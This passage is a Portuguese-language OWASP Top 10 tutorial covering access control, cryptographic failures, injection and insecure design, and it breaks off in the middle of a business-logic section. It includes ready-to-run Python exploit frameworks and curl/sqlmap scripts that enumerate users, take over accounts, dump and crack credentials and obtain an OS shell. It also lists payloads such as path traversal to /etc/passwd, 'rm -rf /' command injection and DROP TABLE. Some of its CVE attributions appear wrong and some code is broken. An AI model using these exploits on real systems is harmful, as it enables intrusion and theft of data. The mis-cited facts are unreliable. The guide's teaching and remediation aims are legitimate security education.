# 🎯 OWASP Top 10 2021 - Guia COMPLETO: Do Iniciante ao Expert

## Com PoC, Exploits, CVEs Reais e Automação

---

## 📚 Índice Geral

- [A01 - Broken Access Control](#a01)
- [A02 - Cryptographic Failures](#a02)
- [A03 - Injection](#a03)
- [A04 - Insecure Design](#a04)
- [A05 - Security Misconfiguration](#a05)
- [A06 - Vulnerable and Outdated Components](#a06)
- [A07 - Authentication Failures](#a07)
- [A08 - Software and Data Integrity Failures](#a08)
- [A09 - Logging and Monitoring Failures](#a09)
- [A10 - Server-Side Request Forgery (SSRF)](#a10)

---

## A01 - BROKEN ACCESS CONTROL {#a01}

### 📌 Resumo Executivo

**Criticidade:** 🔴🔴🔴 CRÍTICA
**CVSS Score:** 8.2 - 9.8 (variável)
**Prevalência:** 94% dos testes encontram esta falha
**Impacto:** Acesso a dados de outros usuários, funções administrativas

---

### 🔧 Explicação Técnica Profunda

#### **O que é Broken Access Control?**

Access Control é a política que define:
- **Quem** pode acessar (autenticação)
- **O quê** pode acessar (autorização)
- **Como** pode acessar (método)
- **Quando** pode acessar (temporal)

**Falha = Qualquer desvio dessa política**

#### **Tipos Específicos de Falhas**

**1. IDOR (Insecure Direct Object Reference)**
```
GET /api/users/123/profile
      └─ Objeto direto (ID) sem validação de ownership

Fluxo:
┌─────────────────────────────────┐
│ Cliente: GET /users/123/profile │
│ Auth: Valid (logado)            │
│ Validação de ownership: ❌      │
│ Resposta: Dados de usuário 123  │
└─────────────────────────────────┘

Problema: Não valida se usuário pode acessar ID 123
```

**2. Horizontal Privilege Escalation**
```
Mesmo nível, mas dados diferentes
User A (ID 1) → tenta acessar User B (ID 2)
Sem validação: Sucesso (falha!)
```

**3. Vertical Privilege Escalation**
```
Usuário comum → acessa função de admin
GET /admin/users (sem validação de role)
Resposta: Lista de usuários (falha!)
```

**4. Path Traversal (Bypass de Autorização)**
```
GET /download?file=report.pdf ✓ OK
GET /download?file=../../../etc/passwd ✗ FALHA

Sem validação de path: Arquivo do sistema exposto
```

**5. Function-Level Access Control Broken**
```
GET /admin → 403 Forbidden
POST /api/admin/create → Aceita (sem role check!)
```

**6. Horizontal + Vertical Combined**
```
User A (baixo privilégio)
├─ Tenta acessar User B dados (horizontal)
└─ E modifica como admin (vertical)
```

---

### 💻 PoC (Proof of Concept) - Executável

#### **PoC 1: IDOR Simples com curl**

```bash
#!/bin/bash
# poc-idor-simple.sh

TARGET="http://vulnerable-app.local"
AUTH_TOKEN="eyJhbGc..."

echo "[*] Testando IDOR - Enumerar usuários"

for user_id in {1..100}; do
  response=$(curl -s -H "Authorization: Bearer $AUTH_TOKEN" \
    "$TARGET/api/users/$user_id/profile")

  # Verificar se tem dados
  if echo "$response" | grep -q "email"; then
    echo "[+] User $user_id: $(echo $response | jq '.email')"
  fi
done
```

#### **PoC 2: IDOR com Burp Suite (Intruder)**

```
1. Interceptar requisição:
   GET /api/users/1/profile HTTP/1.1
   Authorization: Bearer TOKEN

2. Enviar para Intruder
3. Marcar position:
   GET /api/users/§1§/profile

4. Payload: Números 1-1000
5. Executar
6. Filtrar por status 200
7. Verificar dados diferentes
```

#### **PoC 3: Path Traversal com Burp**

```
GET /file?path=document.pdf
GET /file?path=../../../etc/passwd
GET /file?path=..%2F..%2F..%2Fetc%2Fpasswd (URL encoded)
GET /file?path=....//....//....//etc/passwd (double slash bypass)
```

---

### 🛠️ Exploit Completo - Python

```python
#!/usr/bin/env python3
"""
IDOR Exploitation Framework
- Enumera dados de múltiplos usuários
- Detecta padrão de IDs
- Exporta para JSON
"""

import requests
import json
import time
from urllib.parse import urljoin
from typing import List, Dict

class IDORExploit:
    def __init__(self, base_url: str, auth_token: str):
        self.base_url = base_url
        self.headers = {
            'Authorization': f'Bearer {auth_token}',
            'User-Agent': 'Mozilla/5.0'
        }
        self.found_users = []

    def test_idor(self, endpoint: str, id_range: range) -> List[Dict]:
        """
        Testa IDOR em um endpoint específico

        Args:
            endpoint: /api/users/{}/profile
            id_range: range(1, 100)

        Returns:
            Lista de usuários encontrados
        """
        print(f"[*] Testando IDOR em {endpoint}")

        for user_id in id_range:
            url = urljoin(self.base_url, endpoint.format(user_id))

            try:
                resp = requests.get(url, headers=self.headers, timeout=5)

                if resp.status_code == 200:
                    data = resp.json()

                    # Validar que são dados reais
                    if 'email' in data or 'username' in data:
                        user_info = {
                            'id': user_id,
                            'data': data,
                            'timestamp': time.time()
                        }
                        self.found_users.append(user_info)
                        print(f"[+] Usuário {user_id}: {data.get('email', 'N/A')}")

                except requests.exceptions.RequestException as e:
                    print(f"[-] Erro ao acessar {user_id}: {e}")

                time.sleep(0.1)  # Rate limiting

        return self.found_users

    def test_horizontal_escalation(self, endpoint: str, user_id: int) -> bool:
        """
        Testa se pode modificar dados de outro usuário
        """
        url = urljoin(self.base_url, endpoint.format(user_id))

        payload = {
            'email': 'hacked@attacker.com',
            'role': 'admin'
        }

        resp = requests.patch(url, json=payload, headers=self.headers)

        if resp.status_code == 200:
            print(f"[!] CRÍTICO: Conseguiu modificar dados de user {user_id}")
            return True
        return False

    def test_vertical_escalation(self) -> bool:
        """
        Testa se pode acessar funções admin
        """
        admin_endpoints = [
            '/api/admin/users',
            '/admin/panel',
            '/api/v1/admin/settings',
            '/management/users'
        ]

        for endpoint in admin_endpoints:
            url = urljoin(self.base_url, endpoint)
            resp = requests.get(url, headers=self.headers)

            if resp.status_code == 200:
                print(f"[!] CRÍTICO: Admin access sem privilégio: {endpoint}")
                return True

        return False

    def export_findings(self, filename: str = 'idor_findings.json'):
        """Exportar findings em JSON"""
        with open(filename, 'w') as f:
            json.dump(self.found_users, f, indent=2)
        print(f"[+] Dados exportados para {filename}")


# Uso
if __name__ == '__main__':
    # Configurar
    TARGET = "http://vulnerable-app.local"
    TOKEN = "seu_bearer_token_aqui"

    # Explorar
    exploit = IDORExploit(TARGET, TOKEN)

    # Teste 1: IDOR básico
    exploit.test_idor('/api/users/{}/profile', range(1, 101))

    # Teste 2: Modificação (horizontal escalation)
    exploit.test_horizontal_escalation('/api/users/{}', user_id=2)

    # Teste 3: Admin access (vertical escalation)
    exploit.test_vertical_escalation()

    # Exportar
    exploit.export_findings('idor_findings.json')
```

---

### 🔓 Exploit Automatizado - SQLMap + Burp

```bash
#!/bin/bash
# Detecção automática de IDOR com Burp Pro

# 1. Gerar tráfego com Burp
burp &

# 2. Usar extension "Autorizer"
# Marcar requisições como autenticadas/não autenticadas
# Compare respostas

# 3. Scanner automático
burpsuite-professional --scan-user-agent \
  --api-url http://target/api/users/

# 4. Relatório automático
# Gera findings automáticos
```

---

### 🚨 CVEs Reais (Exemplos)

| CVE | Produto | Severidade | Descrição |
|-----|---------|-----------|-----------|
| **CVE-2019-8943** | WordPress Plugin | HIGH | IDOR em user deletion |
| **CVE-2018-9208** | Facebook | HIGH | IDOR em photos |
| **CVE-2017-9824** | Uber API | CRITICAL | IDOR em trips |
| **CVE-2021-22911** | GitHub | HIGH | IDOR em org repos |

---

### 🛡️ Remediação com Código

#### **Antes (Vulnerável)**

```python
@app.route('/api/users/<int:user_id>/profile')
def get_user_profile(user_id):
    user = User.query.get(user_id)  # ❌ Sem validação!
    return jsonify(user.to_dict())
```

#### **Depois (Seguro)**

```python
from flask import current_user
from functools import wraps

def authorize_user(f):
    @wraps(f)
    def wrapper(user_id):
        # ✓ Validar que logado
        if not current_user.is_authenticated:
            abort(401)

        # ✓ Validar ownership
        if current_user.id != user_id:
            abort(403)

        return f(user_id)
    return wrapper

@app.route('/api/users/<int:user_id>/profile')
@authorize_user
def get_user_profile(user_id):
    user = User.query.get(user_id)
    return jsonify(user.to_dict())
```

#### **RBAC Completo (Role-Based Access Control)**

```python
def require_permission(permission: str):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            user = current_user

            # Verificar role
            if not user.has_permission(permission):
                abort(403)

            # Verificar ownership (se necessário)
            if permission == 'read_user_data':
                user_id = kwargs.get('user_id')
                if user.id != user_id and user.role != 'admin':
                    abort(403)

            return f(*args, **kwargs)
        return wrapper
    return decorator

@app.route('/api/users/<int:user_id>/profile')
@require_permission('read_user_data')
def get_user_profile(user_id):
    user = User.query.get(user_id)
    return jsonify(user.to_dict())
```

---

### 🧪 Ferramentas Automatizadas

| Ferramenta | Como Usar | Saída |
|-----------|-----------|-------|
| **Burp Suite (Scanner)** | Automated scan | Relatório com IDs potenciais |
| **Autorizer Extension** | Mark requests | Compare responses |
| **OWASP ZAP** | Fuzzer | Lista de IDs vulneráveis |
| **Nuclei** | nuclei -t idor.yaml | JSON findings |
| **Postman Collection** | Runner + assertions | CSV report |

**Nuclei Template para IDOR:**

```yaml
id: idor-detection

requests:
  - method: GET
    path: /api/users/{{user_id}}/profile

    variables:
      user_id: "1,2,3,4,5"

    headers:
      Authorization: "Bearer {{token}}"

    matchers:
      - type: status
        status: 200
      - type: word
        words: ["email", "username"]
        condition: and

    extractors:
      - type: json
        json:
          - ".email"
          - ".username"

    templates:
      - request: GET /api/users/2/profile
        expected_user: 1
        result: "Different user accessed"
```

---

### 📋 Checklist de Teste IDOR Completo

```
PREPARAÇÃO:
[ ] Identificar endpoints com IDs (users, posts, orders, etc)
[ ] Coletar múltiplos IDs válidos
[ ] Ter acesso autenticado
[ ] Documentar baseline

TESTES HORIZONTAIS:
[ ] Testar com IDs sequenciais (1, 2, 3...)
[ ] Testar com IDs aleatórios (999, 123456)
[ ] Testar com IDs negativos (-1, -2)
[ ] Testar com IDs alpha-numeric (abc, test123)
[ ] Testar encoding (URL, Base64, JWT)
[ ] Testar hash/UUID (ver padrão)
[ ] Modificar GET para POST, PUT, PATCH, DELETE
[ ] Testar sem autenticação (remover token)
[ ] Testar com token de outro usuário

TESTES VERTICAIS:
[ ] Acessar admin endpoints
[ ] Chamar admin functions
[ ] Listar usuários admin
[ ] Modificar configurações globais
[ ] Acessar dados sensíveis

BYPASS:
[ ] Adicionar /admin ao path
[ ] Adicionar ../ para traversal
[ ] Adicionar parâmetros (;type=admin)
[ ] Case sensitivity (ID vs id)
[ ] HTTP method override (X-HTTP-Method-Override)
[ ] Content-Type JSON vs form

AUTOMAÇÃO:
[ ] SQLMap (se parameter injetável)
[ ] Burp Intruder (range IDs)
[ ] Nuclei (templates IDOR)

DOCUMENTAÇÃO:
[ ] Screenshot de acesso
[ ] Curl command que reproduz
[ ] Dados sensíveis vazados
[ ] Impacto comercial
```

---

## A02 - CRYPTOGRAPHIC FAILURES {#a02}

### 📌 Resumo Executivo

**Criticidade:** 🔴🔴🔴 CRÍTICA
**CVSS Score:** 8.1 - 9.8
**Prevalência:** 52% dos testes
**Impacto:** Exposição de dados sensíveis, PII, credenciais

---

### 🔧 Explicação Técnica

#### **Tipos de Falhas Criptográficas**

**1. Transmissão sem Criptografia**

```
HTTP vs HTTPS:

HTTP:  GET /api/user?ssn=123-45-6789&password=secret
       └─ Texto plano, qualquer um na rede pode ver

HTTPS: GET /api/user (corpo criptografado TLS)
       └─ Criptografado fim-a-fim
```

**2. Armazenamento Fraco de Senhas**

```
RUIM:
┌─────────────────────────────┐
│ username | password         │
├─────────────────────────────┤
│ admin    | admin123 (texto) │ ❌ Crítico!
│ user     | password123      │
└─────────────────────────────┘

PÉSSIMO:
password = md5("admin123") = 0192023a7bbd73250516f069df18b500
└─ MD5 é quebrado (rainbow tables)

BOM:
password = bcrypt("admin123", rounds=12) = $2b$12$R9h/cIPz0gi...
└─ Computacionalmente caro

MELHOR:
password = argon2id("admin123", time=3, memory=64M)
└─ Resistente a GPU
```

**3. Criptografia Fraca ou Nenhuma**

```
Dados sensíveis no BD:
❌ credit_card = "4111-1111-1111-1111" (plaintext)
❌ ssn = "123-45-6789"
❌ medical_record = JSON de saúde

✓ credit_card = AES256.encrypt("4111...")
✓ credit_card_token = "tok_live_xyz" (tokenização)
✓ medical_record = encrypted + access_logs
```

**4. Algoritmos Desatualizados**

```
❌ MD5     - Quebrado, não usar
❌ SHA1    - Quebrado para senhas
❌ DES     - Muito fraco (56 bits)
❌ RC4     - Stream cipher inseguro

✓ SHA-256 - Aceitável para hash
✓ SHA-3   - Recomendado
✓ Argon2  - Melhor para senhas
✓ PBKDF2  - Aceitável com iterations altas
✓ bcrypt  - Bom, recomendado
✓ AES-256 - Padrão industria
✓ ChaCha20 - Moderno, bom
```

**5. Falta de Validação de Certificado**

```
HTTPS implementado mas certificado:
❌ Auto-assinado
❌ Expirado
❌ De domínio diferente
❌ CN mismatch

Vulnerabilidade: MITM possível
```

---

### 💻 PoC - Capturando Dados sem Criptografia

#### **PoC 1: Sniffing com Wireshark**

```bash
#!/bin/bash
# Capturar tráfego HTTP não-criptografado

# Iniciar captura
sudo wireshark &

# Ou via tcpdump
sudo tcpdump -i eth0 -w capture.pcap 'tcp port 80'

# Depois filtrar
sudo tcpdump -r capture.pcap -X -l 'tcp.port == 80' | grep -i password
```

**O que você verá em HTTP puro:**
```
GET /login?username=admin&password=secret123 HTTP/1.1
Host: app.com
Cookie: sessionid=abc123def456

POST /api/update HTTP/1.1
Content-Type: application/json

{"credit_card": "4111-1111-1111-1111", "cvv": "123"}
```

#### **PoC 2: Cracking de Hash MD5**

```bash
#!/bin/bash
# Se conseguir acesso ao BD com hashes MD5

# Hash obtido: 5f4dcc3b5aa765d61d8327deb882cf99

# Método 1: Online (Google)
echo "Hash: 5f4dcc3b5aa765d61d8327deb882cf99"
# Resultado: "password"

# Método 2: Rainbow tables
curl "https://md5decrypt.com/api/api.php?hash=5f4dcc3b5aa765d61d8327deb882cf99"

# Método 3: Hashcat
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Resultado: plaintext:password
```

#### **PoC 3: Cracking de Bcrypt (muito mais lento)**

```bash
#!/bin/bash

# Hash Bcrypt: $2b$12$R9h/cIPz0gi.URNNGH3HuOYHYjAKSXZe9Z5yUACxDV8qqoQmB2pia

# Hashcat (SUPER lento em bcrypt)
hashcat -m 3200 -a 0 bcrypt_hash.txt rockyou.txt

# Resultado após DIAS/SEMANAS: pode não quebrar
# Isso é proposital - bcrypt é "memory hard"
```

---

### 🛠️ Exploit - Roubar Dados Criptografados

```python
#!/usr/bin/env python3
"""
Exploit: Exfiltrar dados criptografados e quebrar
"""

import requests
import hashlib
import json
from cryptography.fernet import Fernet
from base64 import b64encode
import subprocess

class CryptoExploit:
    def __init__(self, target: str):
        self.target = target
        self.session = requests.Session()

    def dump_database(self, sql_injection_param: str) -> dict:
        """
        Explorar SQLi para dumpar BD
        """
        payloads = [
            "' UNION SELECT version() --",
            "' UNION SELECT user() --",
            "' UNION SELECT @@global.version --",
        ]

        data = {}

        for payload in payloads:
            resp = self.session.get(
                f"{self.target}/search",
                params={'q': payload}
            )
            data[payload] = resp.text

        return data

    def extract_password_hashes(self, sql_dump: str) -> list:
        """
        Parse de hashes de senha do dump SQL
        """
        import re

        # Procurar padrões de hash
        md5_pattern = r'[a-f0-9]{32}'
        sha1_pattern = r'[a-f0-9]{40}'
        bcrypt_pattern = r'\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}'

        md5_hashes = re.findall(md5_pattern, sql_dump)
        sha1_hashes = re.findall(sha1_pattern, sql_dump)
        bcrypt_hashes = re.findall(bcrypt_pattern, sql_dump)

        return {
            'md5': md5_hashes,
            'sha1': sha1_hashes,
            'bcrypt': bcrypt_hashes
        }

    def crack_hashes(self, hashes: list, hash_type: str = 'md5'):
        """
        Quebrar hashes usando online + local
        """
        results = {}

        for hash_val in hashes:
            # Tentar online first (rápido)
            online_result = self._crack_online(hash_val, hash_type)
            if online_result:
                results[hash_val] = online_result
                continue

            # Senão, usar hashcat (lento)
            if hash_type == 'md5':
                cmd = f"hashcat -m 0 -a 0 {hash_val} /usr/share/wordlists/rockyou.txt"
                result = subprocess.run(cmd, shell=True, capture_output=True)
                if result.returncode == 0:
                    results[hash_val] = result.stdout.decode()

        return results

    def _crack_online(self, hash_val: str, hash_type: str) -> str:
        """
        Usar serviço online de crack (Google, MD5Decrypt, etc)
        """
        try:
            # MD5Decrypt.com API
            resp = requests.get(
                f"https://md5decrypt.com/api/api.php?hash={hash_val}&hash_type={hash_type}",
                timeout=5
            )
            if resp.status_code == 200:
                return resp.text
        except:
            pass

        return None

    def export_findings(self, findings: dict):
        """
        Exportar para relatório
        """
        with open('crypto_exploit_findings.json', 'w') as f:
            json.dump(findings, f, indent=2)


# Uso
if __name__ == '__main__':
    exploit = CryptoExploit("http://vulnerable-app.local")

    # Passo 1: Dumpar BD via SQLi
    sql_dump = exploit.dump_database('search')

    # Passo 2: Extrair hashes
    hashes = exploit.extract_password_hashes(str(sql_dump))

    # Passo 3: Quebrar
    results = exploit.crack_hashes(hashes['md5'], 'md5')

    print("[+] Credenciais quebradas:")
    for hash_val, plaintext in results.items():
        print(f"  {hash_val} = {plaintext}")
```

---

### 🚨 CVEs Reais

| CVE | Produto | Issue |
|-----|---------|-------|
| **CVE-2017-10392** | Oracle Java | Weak encryption default |
| **CVE-2018-1000180** | Jenkins | Plaintext secrets storage |
| **CVE-2019-11358** | jQuery | Data exposure via HTTPS |

---

### 🛡️ Remediação

#### **Senhas - Depois (Seguro)**

```python
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

ph = PasswordHasher()

# Hash de senha
def register(username, password):
    hashed = ph.hash(password)
    db.users.insert({'username': username, 'password': hashed})

# Verificação de senha
def login(username, password):
    user = db.users.find_one({'username': username})

    try:
        ph.verify(user['password'], password)
        return True  # Login sucesso
    except VerifyMismatchError:
        return False  # Senha errada
```

#### **HTTPS Obrigatório**

```python
# Flask
from flask import Flask
from flask_talisman import Talisman

app = Flask(__name__)
Talisman(app, force_https=True)

# Express
app.use(function (req, res, next) {
  if (req.header('x-forwarded-proto') !== 'https') {
    res.redirect(`https://${req.header('host')}${req.url}`);
  } else {
    next();
  }
});
```

#### **Criptografia de Dados em Repouso**

```python
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2

# Gerar chave
def generate_key(password: str, salt: bytes):
    kdf = PBKDF2(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = kdf.derive(password.encode())
    return Fernet(base64.urlsafe_b64encode(key))

# Encriptar dado sensível
def encrypt_field(cipher, plaintext):
    return cipher.encrypt(plaintext.encode()).decode()

# Decriptar
def decrypt_field(cipher, ciphertext):
    return cipher.decrypt(ciphertext.encode()).decode()

# Uso
cipher = generate_key("master_key_secura", b'salt1234567890')
encrypted_ssn = encrypt_field(cipher, '123-45-6789')
db.users.update({'_id': 1}, {'$set': {'ssn': encrypted_ssn}})
```

---

## A03 - INJECTION {#a03}

### 📌 Resumo Executivo

**Criticidade:** 🔴🔴🔴 CRÍTICA
**CVSS Score:** 8.6 - 9.8
**Prevalência:** 97% encontram
**Impacto:** RCE, data breach, DoS

---

### 🔧 Explicação Técnica

#### **Anatomy of Injection Attack**

```
Input não validado + Concatenação em comando/query = INJECTION

Exemplo SQL:
query = "SELECT * FROM users WHERE id = " + user_input
user_input = "1 OR 1=1"
Resultado: SELECT * FROM users WHERE id = 1 OR 1=1

Todos os dados vazados!
```

#### **Tipos de Injection**

**1. SQL Injection**
```sql
-- Union-based
Input: ' UNION SELECT username, password FROM admins --
Result: Dados de admin expostos

-- Boolean-based blind
Input: ' AND 1=1 --  (retorna dados)
Input: ' AND 1=2 --  (sem dados)
Conclusão: Vulnerável!

-- Time-based blind
Input: ' AND SLEEP(5) --
If resposta demora 5s: Vulnerable!

-- Error-based
Input: ' AND extractvalue(rand(), concat(0x3a, version())) --
Error: 5.6.28
Versão exposta!

-- Stacked queries
Input: '; DROP TABLE users; --
Executa múltiplas queries
```

**2. Command Injection**
```bash
input = "localhost; rm -rf /"
ping -c 5 localhost; rm -rf /
#  Comando executado: Sistema formatado!

Bypass:
input = "localhost$(whoami)"    # Comando aninhado
input = "localhost`id`"          # Backticks
input = "localhost|whoami"       # Pipe
input = "localhost&whoami"       # Background + next
input = "localhost&&whoami"      # Condicional
input = "localhost||whoami"      # OU
```

**3. LDAP Injection**
```ldap
Input: *
Consulta: (&(uid=*))
Resultado: Todos os usuários autenticam (bypass)

Input: admin*)(|(uid=*
Consulta: (&(uid=admin*)(|(uid=*))
```

**4. XPath Injection**
```xml
query = "//user[username='" + input + "']"
Input: ' or '1'='1
Result: //user[username='' or '1'='1']
Todos os usuários retornados
```

**5. NoSQL Injection**
```javascript
db.users.find({ username: req.body.username })

Input (JSON): { "$ne": "" }
Query enviada: { username: { "$ne": "" } }
Resultado: Todos os usuários!

Mais payloads:
{ "$gt": "" }     - Greater than (todos)
{ "$in": [] }     - In array
{ "$where": "..." } - Code execution
```

---

### 💻 PoC - SQL Injection

#### **PoC 1: SQLi Básica - curl**

```bash
#!/bin/bash

TARGET="http://vulnerable-app.local"

# Teste 1: Verificar se vulnerável
echo "[*] Testando SQL Injection"
curl "${TARGET}/search.php?q=test' AND 1=1 --"
curl "${TARGET}/search.php?q=test' AND 1=2 --"

# Se respostas diferentes: vulnerável!

# Teste 2: Union Select
curl "${TARGET}/search.php?q=' UNION SELECT version() --"

# Teste 3: Database enumeration
curl "${TARGET}/search.php?q=' UNION SELECT table_name FROM information_schema.tables --"

# Teste 4: Credential dumping
curl "${TARGET}/search.php?q=' UNION SELECT CONCAT(username, ':', password) FROM users --"
```

#### **PoC 2: SQLMap (Automatizado)**

```bash
#!/bin/bash

TARGET="http://vulnerable-app.local"

# Identificar parâmetro vulnerável
sqlmap -u "$TARGET/search.php?q=test" -p q --batch

# Dumpar tabelas
sqlmap -u "$TARGET/search.php?q=test" -p q --tables

# Dumpar dados específicos
sqlmap -u "$TARGET/search.php?q=test" -p q -D mysql -T user --dump

# Dump tudo
sqlmap -u "$TARGET/search.php?q=test" -p q --dump-all

# Ganhar shell
sqlmap -u "$TARGET/search.php?q=test" -p q --os-shell
bash> whoami
```

---

### 🛠️ Exploit - SQL Injection com Extração de Dados

```python
#!/usr/bin/env python3
"""
SQL Injection Exploitation Framework
- Detecção automática
- Extração de dados
- PoC geração
"""

import requests
import re
from urllib.parse import quote
from typing import List, Dict, Tuple

class SQLiExploit:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.vulnerable_params = []
        self.extracted_data = {}

    def test_injection(self, url: str, param: str) -> bool:
        """
        Teste básico de SQL Injection
        """
        payloads = [
            ("' AND '1'='1", "' AND '1'='2"),
            ('" AND "1"="1', '" AND "1"="2'),
            ("' AND 1=1 --", "' AND 1=2 --"),
        ]

        for payload_true, payload_false in payloads:
            try:
                params_true = {param: payload_true}
                params_false = {param: payload_false}

                resp_true = requests.get(url, params=params_true, timeout=5)
                resp_false = requests.get(url, params=params_false, timeout=5)

                # Se respostas diferentes: Vulnerable!
                if resp_true.text != resp_false.text:
                    print(f"[+] SQLi encontrada em {param}")
                    return True

            except requests.exceptions.RequestException:
                pass

        return False

    def extract_version(self, url: str, param: str) -> str:
        """
        Detectar versão do BD via UNION SELECT
        """
        payloads = [
            "' UNION SELECT version() --",
            "' UNION SELECT @@version --",
            "' UNION SELECT sqlite_version() --",
        ]

        for payload in payloads:
            params = {param: payload}
            resp = requests.get(url, params=params)

            # Procurar por padrão de versão
            match = re.search(r'\d+\.\d+\.\d+', resp.text)
            if match:
                return match.group(0)

        return "Unknown"

    def union_select_attack(self, url: str, param: str, columns: int) -> List[str]:
        """
        Executar UNION SELECT para extrair dados

        Primeiro, detectar número de colunas:
        ' ORDER BY 1 --
        ' ORDER BY 2 --
        ' ORDER BY 3 -- (erro = 2 colunas)
        """
        data = []

        # Payload UNION
        placeholders = ", ".join([f"'{i}'" for i in range(1, columns + 1)])
        payload = f"' UNION SELECT {placeholders} --"

        params = {param: payload}
        resp = requests.get(url, params=params)

        # Procurar pelas posições nas respostas
        for i in range(1, columns + 1):
            if str(i) in resp.text:
                print(f"[+] Coluna {i} é visível")
                data.append(f"Column_{i}_visible")

        # Explorar coluna visível
        sensitive_query = f"' UNION SELECT username, password, 3 FROM users --"
        params = {param: sensitive_query}
        resp = requests.get(url, params=params)

        # Parse resposta
        credentials = re.findall(r'([a-zA-Z0-9_]+):([a-zA-Z0-9@!$%^&*]+)', resp.text)

        return credentials

    def time_based_blind_extract(self, url: str, param: str, query: str) -> str:
        """
        Time-based blind SQLi - para casos sem output visível

        SELECT IF(substring(version(), 1, 1) = '5', SLEEP(5), 0)
        """
        result = ""
        charset = "abcdefghijklmnopqrstuvwxyz0123456789"

        for pos in range(1, 50):
            for char in charset:
                # Payload que dorme se char é correto
                payload = f"' AND IF(SUBSTRING(({query}), {pos}, 1) = '{char}', SLEEP(5), 0) --"
                params = {param: payload}

                import time
                start = time.time()
                try:
                    requests.get(url, params=params, timeout=10)
                    elapsed = time.time() - start

                    if elapsed > 4:  # Sleep executado
                        result += char
                        print(f"[+] Extracted: {result}")
                        break

                except requests.exceptions.Timeout:
                    result += char
                    print(f"[+] Extracted: {result}")
                    break

        return result

    def generate_report(self, findings: Dict):
        """
        Gerar relatório estruturado
        """
        report = f"""
SQL INJECTION EXPLOITATION REPORT
==================================

Vulnerabilities Found:
{len(findings)} SQL Injection points

Extracted Data:
- Databases: {findings.get('databases', 'N/A')}
- Tables: {findings.get('tables', 'N/A')}
- Credentials: {len(findings.get('credentials', []))} found

Impacto:
- Confidentiality: BROKEN
- Integrity: BROKEN
- Availability: BROKEN

PoC:
{findings.get('poc', 'N/A')}
"""
        return report


# Uso
if __name__ == '__main__':
    exploit = SQLiExploit("http://vulnerable-app.local")

    # Teste todos os parâmetros
    params = ['q', 'search', 'id', 'user_id', 'email']

    for param in params:
        url = "http://vulnerable-app.local/search.php"
        if exploit.test_injection(url, param):
            print(f"[!] {param} é vulnerável!")

            # Extrair dados
            version = exploit.extract_version(url, param)
            print(f"[+] Database version: {version}")
```

---

### 🚨 CVEs Reais

| CVE | Produto | Impacto |
|-----|---------|--------|
| **CVE-2019-9193** | PostgreSQL | RCE via COPY |
| **CVE-2017-14635** | Joomla | SQLi em menu |
| **CVE-2019-1010006** | Centreon | Blind SQLi |

---

### 🛡️ Remediação - Prepared Statements

#### **Antes (Vulnerável)**

```python
# ❌ PERIGOSO
user_input = request.args.get('search')
query = f"SELECT * FROM users WHERE name LIKE '{user_input}'"
result = db.execute(query)
```

#### **Depois (Seguro)**

```python
# ✓ SEGURO
user_input = request.args.get('search')
query = "SELECT * FROM users WHERE name LIKE ?"
result = db.execute(query, [f"%{user_input}%"])
```

#### **ORMs (Mais Seguro)**

```python
# SQLAlchemy
users = User.query.filter(User.name.ilike(f"%{user_input}%")).all()

# Django ORM
users = User.objects.filter(name__icontains=user_input)

# Mongoose
users = await User.find({ name: new RegExp(user_input, 'i') })
```

---

## A04 - INSECURE DESIGN {#a04}

### 📌 Resumo Executivo

**Criticidade:** 🔴🔴🔴 CRÍTICA
**CVSS Score:** 6.5 - 8.6
**Prevalência:** Crit em app modernas
**Impacto:** Bypass da lógica de negócio

---

### 🔧 Explicação Técnica

**O que é Insecure Design?**

```
Diferença crítica:

INSECURE IMPLEMENTATION (Código ruim):
  password = md5(input)  ← SHA-256 seria melhor
  └─ Código executa, mas fraco

INSECURE DESIGN (Arquitetura fraca):
  Fluxo de reset de senha:
  1. Clicar "Forgot Password"
  2. Email com link
  3. Link sem expiração
  4. Usuário pode acessar depois de 1 ano
  └─ Problema no DESIGN, não implementação
```

#### **Exemplos de Insecure Design**

**1. Validação Fraca de Negócio**
```
E-commerce: Retorno de 30 dias
Produto: $100

User behavior:
Day 1: Compra produto ($100)
Day 31: Retorna e ganha $100 back
Day 32: Produto chega (comprou e retornou!)

Design fraco: Sem validação temporal de retorno
```

**2. Fluxo de Reset de Senha Inseguro**
```
❌ BAD DESIGN:
1. Click "Reset"
2. Email com token:
   https://app.com/reset?token=user123

Problemas:
- Token previsível (user123, user124, user125...)
- Token nunca expira
- Sem validação de limite de tentativas

✓ GOOD DESIGN:
1. Click "Reset"
2. Email com token (256 bits aleatório):
   https://app.com/reset?token=gHk7nL9pQmW2xYz...

Implementação:
- Token expira em 1 hora
- Hash do token armazenado (não plaintext)
- Max 3 tentativas por IP
- Log de todas as tentativas
```

**3. Rate Limiting Ausente**
```
❌ BAD: Tentar 1000 senhas em 1 segundo
✓ GOOD: Max 5 tentativas, esperar 15 min
```

#### **Técnicas de Teste de Insecure Design**

```
1. Threat Model (STRIDE)
   - Mapping de fluxos
   - Identificar pontos fracos

2. Business Logic Testing
   - Testar workflows
   - Procurar bypasses

3. Race Condition Testing
   - Enviar 2 requisições simultâneas
   - Verificar condição de corrida
```

---

### 💻 PoC - Bypass de Lógica de Negócio

#### **PoC 1: Duplicate Order (Race Condition)**

```python
#!/usr/bin/env python3
"""
Race Condition em Checkout
Enviar 2 requisições de compra simultâneas
Resulta em cobrança 1x mas 2 pedidos
"""

import requests
import threading
import time

def place_order(session_id: str, order_id: int):
    """Fazer pedido"""

    url = "http://app.local/api/checkout"
    data = {
        'session_id': session_id,
        'order_id': order_id,
        'amount': 99.99
    }

    resp = requests.post(url, json=data)
    print(f"[+] Order {order_id}: {resp.status_code}")
    return resp

# Enviar 2 requisições no mesmo tempo
session = "user_session_123"

t1 = threading.Thread(target=place_order, args=(session, 1))
t2 = threading.Thread(target=place_order, args=(session, 1))

t1.start()
t2.start()

t1.join()
t2.join()

print("[*] Resultado: 1 cobrança, 2 pedidos criados? (race condition)")
```

#### **PoC 2: Negative Quantity (Lógica Invertida)**

```bash
#!/bin/bash

# Adicionar -1 items ao carrinho
curl -X POST http://app.local/cart/add \
  -d '{"product_id": 123, "quantity": -1}' \
  -H "Content-Type: application/json"

